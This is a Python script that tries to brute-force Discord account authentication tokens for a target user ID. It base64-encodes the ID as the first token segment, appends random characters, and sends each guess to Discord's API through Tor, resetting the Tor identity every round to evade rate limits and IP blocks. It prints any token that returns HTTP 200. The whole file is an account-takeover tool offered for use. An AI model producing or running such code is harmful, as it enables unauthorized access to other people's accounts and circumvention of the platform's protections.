import requests
import random
import base64
import string
from lxml.html import fromstring
import requests
import os
from mod.reqtor import TorRequest

userid = input("[+] input the user id (eg: 12345678): ")
pas = input("[+] input the unhashed password you set for tor: ")
url = "https://discordapp.com/api/v6/users/@me/library"




chk_online = requests.get("https://discord.com")
if chk_online.status_code == 200:
    print("[OK] discord online")
else:
    print("[ERROR] discord offline")
    quit()

tr=TorRequest(password=pas)
count = 1
while True:
    tr.reset_identity()
    response = tr.get('http://ipecho.net/plain').text
    print("[OK] ip used in login ("+response+")")
    print("[-] token try ("+str(count)+")")
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(userid)
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(26))
        token_temp = []
        for i in token:
            token_temp.append(i)
        token_temp[44] = token_temp[44] + "-"

        token = ""
        for i in token_temp:
            token = token + i
        count += 1
        tokens.append(token)
    
    for token in tokens:
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        try:
            r = tr.get(url, headers=header)
            print(r.status_code)
            print(r.headers)
            print(r.content)
            if r.status_code == 200:
                os.system("clear")
                print(u"\u001b[32;1m[OK] token: "+token+"\u001b[0m")
                quit()
            elif "rate limited." in r.text:
                print("[WARNING] rate limit detected")
            else:
                pass
        except Exception as e:
            print("[ERROR] unknown error: "+str(e))
    tokens.remove(token)

